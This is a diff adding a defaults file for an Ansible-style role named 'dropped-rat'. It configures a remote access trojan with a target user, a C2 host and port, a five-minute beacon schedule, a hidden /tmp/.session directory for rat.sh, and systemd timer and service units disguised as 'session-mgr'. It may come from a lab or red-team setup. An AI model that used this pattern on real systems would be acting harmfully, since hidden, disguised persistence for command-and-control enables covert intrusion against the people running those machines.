@@ -1,0 +1,12 @@
+---
+# defaults file for dropped-rat
+
+victim_user: cyrano
+c2_host: c2-server
+c2_port: 6060
+rat_schedule: "*:0/5"
+session_dir: /tmp/.session
+rat_script: /tmp/.session/rat.sh
+rat_log: /tmp/.session/rat.log
+rat_timer_unit: "session-mgr.timer"
+rat_service_unit: "session-mgr.service"
